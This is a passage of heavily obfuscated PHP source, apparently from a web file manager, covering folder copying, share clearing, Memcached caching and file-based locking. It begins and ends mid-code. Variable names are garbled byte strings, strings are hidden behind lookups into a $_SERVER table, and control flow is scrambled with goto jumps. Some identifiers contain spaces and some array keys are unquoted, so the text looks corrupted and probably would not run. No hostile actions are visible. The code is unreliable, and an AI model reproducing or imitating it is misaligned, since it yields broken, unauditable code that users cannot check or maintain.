$aŒëî±Òë½[$aéÑ»ø£Ö[498]]; goto DÑ¾¸¢òí»; DÑ¾¸¢òí»: if (!$cˆ£Ú¥¸í && $this->moveClearAuth) { Model($aéÑ»ø£Ö[496])->authClear($a£¯È¨Áæ¡); } $C³•ÉÎ = $eØ¼ÀèÅ¡µ[$aéÑ»ø£Ö[425]] == $aéÑ»ø£Ö[87] && $aŒëî±Òë½[$aéÑ»ø£Ö[425]] != $aéÑ»ø£Ö[87]; if ($C³•ÉÎ) { $A½éù×³‰®[$aéÑ»ø£Ö[424]] = 0; } goto A§“ç²Š; D‘õ¨’Í‹ƒ: $aéÑ»ø£Ö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eØ¼ÀèÅ¡µ = $this->sourceInfo($a£¯È¨Áæ¡); $aŒëî±Òë½ = $this->sourceInfo($C¯Œ¼İË); goto C¨àç†ç™µ; BòÂÂÍ—ÑÄ: } private function clearShare($Bî¯ÓœÅÀ, $dòÔŞîçÈê) { goto FêÇà‡ê÷‰; Aõ¸ò¢è§: if ($A‡¹„‡ºŠ[$dß«­Û–‹ö[498]] == $Bø›Ï¥»ËÀ[$dß«­Û–‹ö[498]] && $A‡¹„‡ºŠ[$dß«­Û–‹ö[406]] == $dß«­Û–‹ö[588]) { return; } $CãÓË˜¸ÁÊ = array($dß«­Û–‹ö[515] => array($dß«­Û–‹ö[538], $A‡¹„‡ºŠ[$dß«­Û–‹ö[515]] . $Bî¯ÓœÅÀ . $dß«­Û–‹ö[539])); $Dˆñì¨¬Éõ = $this->field($dß«­Û–‹ö[412])->where($CãÓË˜¸ÁÊ)->getField($dß«­Û–‹ö[397], !0); goto BÇğÓó¦¿›; a¼Â„±‘ÁÛ: Model($dß«­Û–‹ö[589])->where($CãÓË˜¸ÁÊ)->save(array($dß«­Û–‹ö[489] => 0)); Model($dß«­Û–‹ö[590])->where($CãÓË˜¸ÁÊ)->delete(); goto B¥Ä¸Ò õ‡; FêÇà‡ê÷‰: $dß«­Û–‹ö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A‡¹„‡ºŠ = $this->sourceInfo($Bî¯ÓœÅÀ); $Bø›Ï¥»ËÀ = $this->sourceInfo($dòÔŞîçÈê); goto Aõ¸ò¢è§; E‰¸–â¢£Ø: if (!$B¹½Õïğƒ„) { return; } $B¹½Õïğƒ„ = array_to_keyvalue($B¹½Õïğƒ„, $dß«­Û–‹ö[33], $dß«­Û–‹ö[482]); $CãÓË˜¸ÁÊ = array($dß«­Û–‹ö[482] => array($dß«­Û–‹ö[7], $B¹½Õïğƒ„)); goto a¼Â„±‘ÁÛ; BÇğÓó¦¿›: if (!$Dˆñì¨¬Éõ) { return; } $CãÓË˜¸ÁÊ = array($dß«­Û–‹ö[397] => array($dß«­Û–‹ö[7], $Dˆñì¨¬Éõ), $dß«­Û–‹ö[489] => 1); $B¹½Õïğƒ„ = Model($dß«­Û–‹ö[589])->field($dß«­Û–‹ö[482])->where($CãÓË˜¸ÁÊ)->select(); goto E‰¸–â¢£Ø; B¥Ä¸Ò õ‡: } public function copyFolderFromIO($bĞßˆ©±›ƒ, $EËÄ÷ŸÕ, $Eä£À£±¥, $F˜õƒÈí÷, $f‚è‘“’Û², $f…âÍĞà³ = false) { goto eÚï¹ĞÁÈ; A¶ï¯İ÷—: Model($f·…ìèä¬‹[557])->addAll($F¹Í³ç¥™ˆ[$f·…ìèä¬‹[555]], array(), !0); Model($f·…ìèä¬‹[558])->eventCopy($d„Ñø‚‹Š“); $this->saveAll($F¹Í³ç¥™ˆ[$f·…ìèä¬‹[556]]); goto C‡öÊ„; e¨Ûˆ‚Äƒ‹: $BÊìŒÊâç = $this->fileNameExist($Eä£À£±¥, $E¶ĞªÍÂ); $d„Ñø‚‹Š“ = $this->mkdir($Eä£À£±¥, $E¶ĞªÍÂ, $F˜õƒÈí÷); if (!$BÊìŒÊâç || $F˜õƒÈí÷ == REPEAT_RENAME_FOLDER) { $F˜õƒÈí÷ = !1; } goto D²¶„¶Åâä; A²Î›¢÷Ò÷: $this->updateModifyTime($Eä£À£±¥); return $d„Ñø‚‹Š“; goto b×‡…ê¦´; Bê—Àí½ã: Hook::trigger($f·…ìèä¬‹[593]); if ($d„Ñø‚‹Š“) { $this->folderSizeResetChildren($d„Ñø‚‹Š“); } $this->_childrenListClear(); goto A¶ï¯İ÷—; eÚï¹ĞÁÈ: $f·…ìèä¬‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F¹Í³ç¥™ˆ = array($f·…ìèä¬‹[555] => array(), $f·…ìèä¬‹[556] => array(), $f·…ìèä¬‹[554] => array(), $f·…ìèä¬‹[591] => array()); $E¶ĞªÍÂ = $f…âÍĞà³ ? $f…âÍĞà³ : $bĞßˆ©±›ƒ->pathThis($EËÄ÷ŸÕ); goto e¨Ûˆ‚Äƒ‹; D²¶„¶Åâä: if ($BÊìŒÊâç) { $this->_childrenAllMake($BÊìŒÊâç); } Hook::trigger($f·…ìèä¬‹[592]); $this->_copyChildTo($bĞßˆ©±›ƒ, $EËÄ÷ŸÕ, $d„Ñø‚‹Š“, $F˜õƒÈí÷, $F¹Í³ç¥™ˆ, $f‚è‘“’Û²); goto Bê—Àí½ã; C‡öÊ„: Model($f·…ìèä¬‹[464])->linkAdd($F¹Í³ç¥™ˆ[$f·…ìèä¬‹[554]]); Model($f·…ìèä¬‹[464])->remove($F¹Í³ç¥™ˆ[$f·…ìèä¬‹[591]]); $this->folderSizeReset($Eä£À£±¥); goto A²Î›¢÷Ò÷; b×‡…ê¦´: } private function _copyChildTo($E‚ÆÎ‚’…, $C‹óâ…í£, $c ‡»Ìğê, $CÙíİÊà, &$fÚáÁ§¿óë, $fá£Ô•ŞÑÎ) { goto bò®Ù¶÷øØ; C£œŸæŠ¢Ô: $C™ñÍ”‡ã‰ = $C™ñÍ”‡ã‰ ? $C™ñÍ”‡ã‰ : array($CŠˆ„ß¢·£[74] => array(), $CŠˆ„ß¢·£[75] => array()); $Fô‹ñ…ÚÂ¹ = array_merge($C™ñÍ”‡ã‰[$CŠˆ„ß¢·£[74]], $C™ñÍ”‡ã‰[$CŠˆ„ß¢·£[75]]); $D×â¨íÂ‹Ø = $this->_addFiles($E‚ÆÎ‚’…, $C™ñÍ”‡ã‰[$CŠˆ„ß¢·£[74]], $fá£Ô•ŞÑÎ); goto eˆ¦Æ°É†ò; eÃ±Â…ö³á: if (!empty($e­ù£Ş¡ê)) { $this->addAll($e­ù£Ş¡ê); $this->_childrenListSelect($c ‡»Ìğê); } $Dğ“º—Ê´„ = $this->_childrenList($c ‡»Ìğê); $Dğ“º—Ê´„ = array_to_keyvalue($Dğ“º—Ê´„, $CŠˆ„ß¢·£[28]); goto E‡¢½´ì¨; bò®Ù¶÷øØ: $CŠˆ„ß¢·£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¦“ÄŞßñ¡ = $this->sourceInfoCache($c ‡»Ìğê); $C™ñÍ”‡ã‰ = $E‚ÆÎ‚’…->listPath($C‹óâ…í£); goto C£œŸæŠ¢Ô; E‡¢½´ì¨: foreach ($Fô‹ñ…ÚÂ¹ as $D©Ü Ñš¹) { $Fòƒ‡‚¿º“ = $Dğ“º—Ê´„[$D©Ü Ñš¹[$CŠˆ„ß¢·£[28]]]; $Dóƒë›¬£¹ = $Fòƒ‡‚¿º“[$CŠˆ„ß¢·£[397]]; $this->_copyApplyMeta($Fòƒ‡‚¿º“, $fÚáÁ§¿óë); if ($D©Ü Ñš¹[$CŠˆ„ß¢·£[29]] == $CŠˆ„ß¢·£[77]) { $D©Ü Ñš¹[$CŠˆ„ß¢·£[76]] = $E‚ÆÎ‚’…->getPathInner($D©Ü Ñš¹[$CŠˆ„ß¢·£[76]]); $this->_copyChildTo($E‚ÆÎ‚’…, $D©Ü Ñš¹[$CŠˆ„ß¢·£[76]], $Dóƒë›¬£¹, $CÙíİÊà, $fÚáÁ§¿óë, $fá£Ô•ŞÑÎ); } } goto A´î…Òğ†; eˆ¦Æ°É†ò: $e­ù£Ş¡ê = array(); foreach ($Fô‹ñ…ÚÂ¹ as &$D©Ü Ñš¹) { goto a‹µÒßÆ·¤; a‹µÒßÆ·¤: if (isset($D×â¨íÂ‹Ø[$D©Ü Ñš¹[$CŠˆ„ß¢·£[28]]])) { $D©Ü Ñš¹ = $D×â¨íÂ‹Ø[$D©Ü Ñš¹[$CŠˆ„ß¢·£[28]]]; } $D©Ü Ñš¹[$CŠˆ„ß¢·£[405]] = $D©Ü Ñš¹[$CŠˆ„ß¢·£[29]] == $CŠˆ„ß¢·£[77]; $D©Ü Ñš¹[$CŠˆ„ß¢·£[407]] = _get($D©Ü Ñš¹, $CŠˆ„ß¢·£[168], $CŠˆ„ß¢·£[33]); goto aèíÔ»Ğ–¦; F©–‹Ñêò: if ($CÙíİÊà) { $E‹Ğİæ¥šæ = $this->fileNameExistCache($c ‡»Ìğê, $D©Ü Ñš¹[$CŠˆ„ß¢·£[28]]); if ($E‹Ğİæ¥šæ) { if ($D©Ü Ñš¹[$CŠˆ„ß¢·£[405]] || $CÙíİÊà == REPEAT_SKIP) { continue; } if ($CÙíİÊà == REPEAT_REPLACE) { $Fòƒ‡‚¿º“ = $this->sourceInfoCache($E‹Ğİæ¥šæ); $e§…œœÂÏ¨ = $this->fileHistory($Fòƒ‡‚¿º“, $D©Ü Ñš¹[$CŠˆ„ß¢·£[461]], $D©Ü Ñš¹[$CŠˆ„ß¢·£[78]]); if ($e§…œœÂÏ¨) { $fÚáÁ§¿óë[$CŠˆ„ß¢·£[554]][] = $D©Ü Ñš¹[$CŠˆ„ß¢·£[461]]; } continue; } else { if ($CÙíİÊà == REPEAT_RENAME) { $D©Ü Ñš¹[$CŠˆ„ß¢·£[28]] = $this->fileNameAutoCache($c ‡»Ìğê, $D©Ü Ñš¹[$CŠˆ„ß¢·£[28]], $CÙíİÊà, !1); } } } } if (!$D©Ü Ñš¹[$CŠˆ„ß¢·£[405]] && $D©Ü Ñš¹[$CŠˆ„ß¢·£[461]]) { $fÚáÁ§¿óë[$CŠˆ„ß¢·£[554]][] = $D©Ü Ñš¹[$CŠˆ„ß¢·£[461]]; } $e­ù£Ş¡ê[] = $this->_makeItemData($D©Ü Ñš¹, $f¦“ÄŞßñ¡, $D©Ü Ñš¹[$CŠˆ„ß¢·£[28]]); goto B“ó®Ü²á; aèíÔ»Ğ–¦: $D©Ü Ñš¹[$CŠˆ„ß¢·£[78]] = _get($D©Ü Ñš¹, $CŠˆ„ß¢·£[78], 0); $D©Ü Ñš¹[$CŠˆ„ß¢·£[461]] = _get($D©Ü Ñš¹, $CŠˆ„ß¢·£[461], 0); if (!isset($D©Ü Ñš¹[$CŠˆ„ß¢·£[594]]) && $D©Ü Ñš¹[$CŠˆ„ß¢·£[461]]) { $fÚáÁ§¿óë[$CŠˆ„ß¢·£[591]][] = $D©Ü Ñš¹[$CŠˆ„ß¢·£[461]]; } goto F©–‹Ñêò; B“ó®Ü²á: } unset($D©Ü Ñš¹); goto eÃ±Â…ö³á; A´î…Òğ†: } private function _addFiles($FÁ“ŒŠÔ­¸, $FÕáÓôò‰, $D­ˆö˜šÈ) { goto DÜåÙÑìø¼; A—¢­¨…Ä: foreach ($FÕáÓôò‰ as &$d¾çÉ†—…‹) { goto Eøß¨ÉÉë; Fø÷›Ò¨á¥: $c¬ßæ¥™ê = $FÁ“ŒŠÔ­¸->hashMd5($d¾çÉ†—…‹[$böÂÂç «×[76]]); if (strlen($c¬ßæ¥™ê) > 10 && !isset($A‰…¯ËÜÙÊ[$c¬ßæ¥™ê])) { $A‰…¯ËÜÙÊ[$c¬ßæ¥™ê] = array(); } $d¾çÉ†—…‹[$böÂÂç «×[171]] = $aöÁã¨¨‚ó; goto F¨·îœ…åñ; F¨·îœ…åñ: $d¾çÉ†—…‹[$böÂÂç «×[170]] = $c¬ßæ¥™ê; Hook::trigger($böÂÂç «×[596], $d¾çÉ†—…‹); $A‰…¯ËÜÙÊ[$c¬ßæ¥™ê][] =& $d¾çÉ†—…‹; goto f‹Š‹‘’Û©; Eøß¨ÉÉë: Hook::trigger($böÂÂç «×[595], $d¾çÉ†—…‹); $d¾çÉ†—…‹[$böÂÂç «×[76]] = $FÁ“ŒŠÔ­¸->getPathInner($d¾çÉ†—…‹[$böÂÂç «×[76]]); $aöÁã¨¨‚ó = $FÁ“ŒŠÔ­¸->hashSimple($d¾çÉ†—…‹[$böÂÂç «×[76]]); goto Fø÷›Ò¨á¥; f‹Š‹‘’Û©: if (count($A‰…¯ËÜÙÊ[$c¬ßæ¥™ê]) > 1) { $d¾çÉ†—…‹[$böÂÂç «×[594]] = !0; } goto DË“öË„¯; DË“öË„¯: } unset($d¾çÉ†—…‹); $fñÚšïŒö” = array($böÂÂç «×[170] => array($böÂÂç «×[7], array_keys($A‰…¯ËÜÙÊ))); goto e‰êŞ‰Â‹ª; F¸¥Ò‡Àİä: $eÙĞ³Æâôø = $eÙĞ³Æâôø ? $eÙĞ³Æâôø : array(); foreach ($eÙĞ³Æâôø as $eîˆ÷‚Ü‰•) { if (!isset($A‰…¯ËÜÙÊ[$eîˆ÷‚Ü‰•[$böÂÂç «×[170]]])) { continue; } $cØïõ“µ± =& $A‰…¯ËÜÙÊ[$eîˆ÷‚Ü‰•[$böÂÂç «×[170]]]; foreach ($cØïõ“µ± as &$d¾çÉ†—…‹) { $d¾çÉ†—…‹[$böÂÂç «×[461]] = $eîˆ÷‚Ü‰•[$böÂÂç «×[461]]; } unset($d¾çÉ†—…‹); } $F¶„èÇ™½ = array(); goto e¿×’÷‰®™; e‰êŞ‰Â‹ª: $F‚»¦Ï¹ï = Model($böÂÂç «×[597]); $eÙĞ³Æâôø = $F‚»¦Ï¹ï->where($fñÚšïŒö”)->select(); $eÙĞ³Æâôø = $eÙĞ³Æâôø ? $eÙĞ³Æâôø : array(); goto DîÏ©÷Ò—; e¿×’÷‰®™: foreach ($FÕáÓôò‰ as $Aê„’ìÈò) { $F¶„èÇ™½[$Aê„’ìÈò[$böÂÂç «×[28]]] = $Aê„’ìÈò; } return $F¶„èÇ™½; goto aë¸äàæ£¾; cŠíîô½ô¬: $F‚»¦Ï¹ï->addAll($c™Ç¤¢š…ƒ); $fñÚšïŒö” = array($böÂÂç «×[170] => array($böÂÂç «×[7], array_keys($A‰…¯ËÜÙÊ))); $eÙĞ³Æâôø = $F‚»¦Ï¹ï->where($fñÚšïŒö”)->select(); goto F¸¥Ò‡Àİä; DÜåÙÑìø¼: $böÂÂç «× =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$FÕáÓôò‰ || count($FÕáÓôò‰) == 0) { return array(); } $A‰…¯ËÜÙÊ = array(); goto A—¢­¨…Ä; DîÏ©÷Ò—: foreach ($eÙĞ³Æâôø as $eîˆ÷‚Ü‰•) { if (!isset($A‰…¯ËÜÙÊ[$eîˆ÷‚Ü‰•[$böÂÂç «×[170]]])) { continue; } $a»¹ ì…„¹ = $A‰…¯ËÜÙÊ[$eîˆ÷‚Ü‰•[$böÂÂç «×[170]]]; foreach ($a»¹ ì…„¹ as &$d¾çÉ†—…‹) { $d¾çÉ†—…‹[$böÂÂç «×[461]] = $eîˆ÷‚Ü‰•[$böÂÂç «×[461]]; $d¾çÉ†—…‹[$böÂÂç «×[594]] = !0; } unset($d¾çÉ†—…‹); } $c™Ç¤¢š…ƒ = array(); foreach ($FÕáÓôò‰ as $bÕîÀÊ„ñè) { if (isset($bÕîÀÊ„ñè[$böÂÂç «×[594]]) && $bÕîÀÊ„ñè[$böÂÂç «×[594]]) { continue; } $EÃ¨ÜÓ¿› = $FÁ“ŒŠÔ­¸->getPathInner($bÕîÀÊ„ñè[$böÂÂç «×[76]]); $e¬Áãòƒƒ = $F‚»¦Ï¹ï->addFileMake($EÃ¨ÜÓ¿›, $bÕîÀÊ„ñè[$böÂÂç «×[78]], $bÕîÀÊ„ñè[$böÂÂç «×[171]], $bÕîÀÊ„ñè[$böÂÂç «×[170]], $bÕîÀÊ„ñè[$böÂÂç «×[28]], $D­ˆö˜šÈ); $c™Ç¤¢š…ƒ[] = $e¬Áãòƒƒ; } goto cŠíîô½ô¬; aë¸äàæ£¾: } } define($_SERVER[Ôğ—¤Šµˆ˜ñ£][598], $_SERVER[Ôğ—¤Šµˆ˜ñ£][599]); goto bõ÷Ì®Ñİ…; Dˆ¸Ãä¨Æ†: class CacheMemcached { public $handle; public $cacheTime; public function __construct($F¨ßí‰©ÛÔ, $D¿»ÁƒÖö¸) { $fÑ¬š•£ôº =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!class_exists($fÑ¬š•£ôº[844])) { show_json($fÑ¬š•£ôº[845], !1); } $this->cacheTime = $D¿»ÁƒÖö¸; $this->handle = new Memcached(); if (is_array($F¨ßí‰©ÛÔ[$fÑ¬š•£ôº[846]]) && count($F¨ßí‰©ÛÔ[$fÑ¬š•£ôº[846]]) >= 1) { foreach ($F¨ßí‰©ÛÔ[$fÑ¬š•£ôº[846]] as $Fäğâ‰«ƒ›) { $bëÊÜ°çğè = explode($fÑ¬š•£ôº[4], $Fäğâ‰«ƒ›); $this->handle->addServer($bëÊÜ°çğè[0], $bëÊÜ°çğè[1]); } } else { $this->handle->addServer($F¨ßí‰©ÛÔ[$fÑ¬š•£ôº[175]], $F¨ßí‰©ÛÔ[$fÑ¬š•£ôº[176]]); } } public function set($Cß µÖİ©Ñ, $C½Ö÷¡Àê‚, $cÍÛ¾´›·ß = false) { $cÍÛ¾´›·ß = $cÍÛ¾´›·ß ? $cÍÛ¾´›·ß : $this->cacheTime; return $this->handle->set($Cß µÖİ©Ñ, $C½Ö÷¡Àê‚, $cÍÛ¾´›·ß); } public function get($fßéÒ™¤¼) { return $this->handle->get($fßéÒ™¤¼); } public function remove($eËÛƒ«³èŞ) { return $this->handle->delete($eËÛƒ«³èŞ); } public function deleteAll() { return $this->handle->flush(); } } $FèòÙñˆ§Œ = $_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][847]]; $A«çÔ…ŠÁÁ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][848]; goto fÄÆ×„•; Fº—½„ä¼Ø: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto CÚÂ¿ÆÇ»ö; CÚÂ¿ÆÇ»ö: $B©µƒ½ó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (self::$handle) { return self::$handle; } $FÀ¿òìø = $GLOBALS[$B©µƒ½ó[6]][$B©µƒ½ó[347]]; goto b¦±­¡ÔÜ; b¦±­¡ÔÜ: self::$timeout = $FÀ¿òìø[$B©µƒ½ó[828]] ? $FÀ¿òìø[$B©µƒ½ó[828]] : 10; $cÎÙŞ‹Îï = _get($GLOBALS[$B©µƒ½ó[6]], $B©µƒ½ó[829]); $a¶¹ÕİôÒé = $FÀ¿òìø[$B©µƒ½ó[815]] ? $FÀ¿òìø[$B©µƒ½ó[815]] : $B©µƒ½ó[193]; goto dñ™Âà­ßà; dñ™Âà­ßà: if ($a¶¹ÕİôÒé == $B©µƒ½ó[17] && $cÎÙŞ‹Îï == $B©µƒ½ó[9]) { $a¶¹ÕİôÒé = $B©µƒ½ó[193]; } switch ($a¶¹ÕİôÒé) { case $B©µƒ½ó[818]: self::$handle = new CacheLockRedis(); break; case $B©µƒ½ó[819]: self::$handle = new CacheLockMemcached(); break; case $B©µƒ½ó[17]: self::$handle = new CacheLockDatabase(); break; case $B©µƒ½ó[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto eåÉšˆÓÎ; eåÉšˆÓÎ: } private static function key($B¦‘ç„º‘Ò) { return $_SERVER[Ôğ—¤Šµˆ˜ñ£][830] . Cache::key($B¦‘ç„º‘Ò); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Bï´Ê©ì±Ÿ = '') { self::$errorMsg = $Bï´Ê©ì±Ÿ; } public static function lockGlobal($Fºí“ùëÍ, $E‡¯Òß¢§) { return self::lock($Fºí“ùëÍ, $E‡¯Òß¢§, !0); } public static function lock($aÄ©‡®ç¤, $c‹•Ú×ÄÑ¿ = false, $e¤æ‡† áä = false) { goto CÅèÎßöùÀ; døª–ëšÓ: if (!$e¤æ‡† áä) { self::$lockItem[$Fæíˆ‹•] = !0; } return $Aë„¿¾Í; goto fÄë Üø£í; CÅèÎßöùÀ: $fà¬£»Éî =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fäÒóÊÚ¯Ã = self::init(); $Fæíˆ‹• = self::key($aÄ©‡®ç¤); goto aÇì»Ó¡Ğ; aÇì»Ó¡Ğ: $c‹•Ú×ÄÑ¿ = $c‹•Ú×ÄÑ¿ ? $c‹•Ú×ÄÑ¿ : self::$timeout; $Aë„¿¾Í = $fäÒóÊÚ¯Ã->lock($Fæíˆ‹•, $c‹•Ú×ÄÑ¿); if (!$Aë„¿¾Í) { $C‰µ³ºÙ = "\x6c\157\x63\153\40\145\162\x72\x6f\x72\73\x6b\145\x79\x3d{$aÄ©‡®ç¤}\x3b\164\151\x6d\x65\x3d{$c‹•Ú×ÄÑ¿}\73" . self::$errorMsg . $fà¬£»Éî[68] . get_caller_msg(); $CÊÑ“–“ù = LNG($fà¬£»Éî[831]) . "\x28{$c‹•Ú×ÄÑ¿}\x73\51\56" . LNG($fà¬£»Éî[832]); $CÊÑ“–“ù .= $fà¬£»Éî[833]; if (is_string(self::$errorMsg) && self::$errorMsg) { $CÊÑ“–“ù = $CÊÑ“–“ù . $fà¬£»Éî[834] . self::$errorMsg; } write_log($C‰µ³ºÙ, $fà¬£»Éî[835]); show_json($CÊÑ“–“ù, !1); } goto døª–ëšÓ; fÄë Üø£í: } public static function lockGet($e£ø‚§˜½°) { $fŠ§¥£‘ë© = self::key($e£ø‚§˜½°); if (self::$lockItem[$fŠ§¥£‘ë©]) { return self::$lockItem[$fŠ§¥£‘ë©]; } return self::init()->lockGet($fŠ§¥£‘ë©); } public static function unlock($a„ë‰¹«ÛÚ) { $Aäçì‹ğ = self::key($a„ë‰¹«ÛÚ); self::$lockItem[$Aäçì‹ğ] = null; return self::init()->unlock($Aäçì‹ğ); } public static function unlockRuntime() { $DùÃñ‡À¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AàÔÊ›æ = self::init(); $dÆ¸ù«ÁÃø = !1; foreach (self::$lockItem as $A´°…†µÖÆ => $e“ğ”öÙæ‘) { if (!$e“ğ”öÙæ‘) { continue; } $AàÔÊ›æ->unlock($A´°…†µÖÆ); if (!$dÆ¸ù«ÁÃø) { $dÆ¸ù«ÁÃø = !0; write_log($DùÃñ‡À¾[836] . $A´°…†µÖÆ . $DùÃñ‡À¾[68] . get_caller_msg(), $DùÃñ‡À¾[835]); continue; } write_log($DùÃñ‡À¾[836] . $A´°…†µÖÆ, $DùÃñ‡À¾[835]); } self::fileUnlockAll(); } public static function fileLock($FÎ°‘Œª²) { goto eƒã¤ÀáÄí; E…¶ £©•µ: if (flock($DĞÚ‘ÙìÂ›, LOCK_EX)) { return !0; } self::unlock($FÎ°‘Œª²); show_json($BŒ¥ˆëñø[840], !1); goto aÓ™°¹†‹ñ; FÜ»æÉòÃ: $DĞÚ‘ÙìÂ› = fopen(DATA_PATH . $FÎ°‘Œª² . $BŒ¥ˆëñø[838], $BŒ¥ˆëñø[839]); if (!$DĞÚ‘ÙìÂ›) { return !1; } $GLOBALS[$BŒ¥ˆëñø[837]][$FÎ°‘Œª²] = $DĞÚ‘ÙìÂ›; goto E…¶ £©•µ; eƒã¤ÀáÄí: $BŒ¥ˆëñø =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$GLOBALS[$BŒ¥ˆëñø[837]]) { $GLOBALS[$BŒ¥ˆëñø[837]] = array(); } $GLOBALS[$BŒ¥ˆëñø[837]][$FÎ°‘Œª²] = !1; goto FÜ»æÉòÃ; aÓ™°¹†‹ñ: return !1; goto b·Æ·§ßµ›; b·Æ·§ßµ›: } public static function fileUnlock($CàöŒ„Ô¯) { $dîÌ¤ì„Òä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Aâ¾„¨Ù’ = $GLOBALS[$dîÌ¤ì„Òä[837]][$CàöŒ„Ô¯]; if (!$Aâ¾„¨Ù’) { return; } $GLOBALS[$dîÌ¤ì„Òä[837]][$CàöŒ„Ô¯] = !1; flock($Aâ¾„¨Ù’, LOCK_UN); fclose($Aâ¾„¨Ù’); } public static function fileUnlockAll() { $a÷›ñ×™èí =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$GLOBALS[$a÷›ñ×™èí[837]]) { return; } foreach ($GLOBALS[$a÷›ñ×™èí[837]] as $BÀ‹ÅÑôÈ• => $CÂ¯‡¡ä¸Š) { if (!$CÂ¯‡¡ä¸Š) { continue; } $GLOBALS[$a÷›ñ×™èí[837]][$BÀ‹ÅÑôÈ•] = !1; flock($CÂ¯‡¡ä¸Š, LOCK_UN); fclose($CÂ¯‡¡ä¸Š); } $GLOBALS[$a÷›ñ×™èí[837]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $C”¨•šŸ´• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eï¸âÕô“… = $GLOBALS[$C”¨•šŸ´•[6]][$C”¨•šŸ´•[347]]; self::$cachePath = $eï¸âÕô“…[$C”¨•šŸ´•[193]][$C”¨•šŸ´•[76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($d–ùÃ˜Ä, $F…¿Ì–—‰Ì = 0) { goto E½ƒÃ‚®¹‘; eƒÎï¦£¯: $Bß„´Ş°Ğ = rtrim(self::$cachePath, $E‘ôã×Ûí¼[8]) . $E‘ôã×Ûí¼[841] . md5($d–ùÃ˜Ä) . $E‘ôã×Ûí¼[838]; if (file_exists($Bß„´Ş°Ğ) && filemtime($Bß„´Ş°Ğ) && filemtime($Bß„´Ş°Ğ) < time() - 10) { @unlink($Bß„´Ş°Ğ); } do { if (file_exists($Bß„´Ş°Ğ)) { cacheLockWait(); continue; } $CÀ ÄŒ™Í° = fopen($Bß„´Ş°Ğ, $E‘ôã×Ûí¼[842]); if (!$CÀ ÄŒ™Í°) { return !1; } $c™¿Š¥Å¶ = flock($CÀ ÄŒ™Í°, LOCK_EX | LOCK_NB); self::$caches[$d–ùÃ˜Ä] = array($E‘ôã×Ûí¼[843] => $CÀ ÄŒ™Í°, $E‘ôã×Ûí¼[193] => $Bß„´Ş°Ğ); fwrite($CÀ ÄŒ™Í°, $bâƒó’½ñ”); clearstatcache(); if ($CÀ ÄŒ™Í° && $c™¿Š¥Å¶) { return !0; } cacheLockWait(); } while (microtime(!0) < $bâƒó’½ñ”); goto fÔÉ‹ÏíÚ; fÔÉ‹ÏíÚ: $this->unlock($d–ùÃ˜Ä); return !1; goto eå·‡¤á™‰; E½ƒÃ‚®¹‘: $E‘ôã×Ûí¼ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d±Ã«÷“™è = microtime(!0); $bâƒó’½ñ” = $d±Ã«÷“™è + $F…¿Ì–—‰Ì + 0.0001; goto eƒÎï¦£¯; eå·‡¤á™‰: } public function lockGet($AâêÕ±ŠŞé) { $a‘ÖĞªñö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c„ÔŒ¿‡¥¾ = rtrim(self::$cachePath, $a‘ÖĞªñö[8]) . $a‘ÖĞªñö[841] . md5($AâêÕ±ŠŞé) . $a‘ÖĞªñö[838]; return file_exists($c„ÔŒ¿‡¥¾); } public function unlock($aßÈ‚»†—) { goto a˜Ú¬½•¥; a˜Ú¬½•¥: $e†„ŒÂÉéÊ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aŒ¬â’¨ = self::$caches[$aßÈ‚»†—]; if (!$aŒ¬â’¨) { return; } goto FÌÆÚõ—˜ø; b—×Ñ‚…¾à: unset(self::$caches[$aßÈ‚»†—]); goto B’ÃïßÏ…Ã; FÌÆÚõ—˜ø: @flock($aŒ¬â’¨[$e†„ŒÂÉéÊ[843]], LOCK_UN); @fclose($aŒ¬â’¨[$e†„ŒÂÉéÊ[843]]); @unlink($aŒ¬â’¨[$e†„ŒÂÉéÊ[193]]); goto b—×Ñ‚…¾à; B’ÃïßÏ…Ã: } } goto C‡„×áïÎ; ašèÏ­×º: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($DêóŒìÏÑ) { $this->pathParse = $DêóŒìÏÑ; $this->model = Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][1227]); } public function getPath($Ağ»ÂÁğäº) { return trim($Ağ»ÂÁğäº, $_SERVER[Ôğ—¤Šµˆ˜ñ£][8]); } public function pathFather($dÇÕÕ–ÉÁ¬) { $e¥ïíÖ£õ½ = $this->parse($dÇÕÕ–ÉÁ¬); $e¥ïíÖ£õ½ = $this->infoSimple($dÇÕÕ–ÉÁ¬); return $e¥ïíÖ£õ½ ? $e¥ïíÖ£õ½[$_SERVER[Ôğ—¤Šµˆ˜ñ£][492]] : !1; } public function pathThis($B¼Û²×ÂíÃ) { $F¨Ò§øÊò = $this->infoSimple($B¼Û²×ÂíÃ); return $F¨Ò§øÊò ? $F¨Ò§øÊò[$_SERVER[Ôğ—¤Šµˆ˜ñ£][28]] : !1; } public function getPathOuter($F”¸¯ôÂäğ) { if (!$F”¸¯ôÂäğ) { return $F”¸¯ôÂäğ; } $aõÑ™â æø = $this->parse($F”¸¯ôÂäğ); return KodIO::make($aõÑ™â æø[$_SERVER[Ôğ—¤Šµˆ˜ñ£][395]]); } public function copyFolderFromIO($e´£Å¨²‰×, $B™Ó“¸»Ù, 